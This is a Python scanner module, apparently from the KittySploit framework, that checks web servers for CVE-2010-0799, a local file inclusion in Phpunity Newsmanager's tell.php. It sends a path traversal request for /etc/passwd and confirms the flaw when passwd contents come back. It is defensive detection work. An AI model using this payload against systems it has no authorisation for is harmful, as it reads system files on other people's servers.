#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2010-0799 via misc/tell_a_friend/tell."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Phpunity Newsmanager - tell.php LFI Detection (CVE-2010-0799)',
        'description': (
            'Detects CVE-2010-0799 via misc/tell_a_friend/tell.php?id=../../../../etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'phpunity', 'lfi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2010-0799',
        ],
        'cve': 'CVE-2010-0799',
    }

    def run(self):
        for base in ('', '/phpunity', '/newsmanager'):
            path = f'{base}/misc/tell_a_friend/tell.php?id=../../../../../../../etc/passwd'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(severity='high', reason='Phpunity Newsmanager tell.php LFI (CVE-2010-0799)', path=f'{base}/misc/tell_a_friend/tell.php')
                return True
        return False

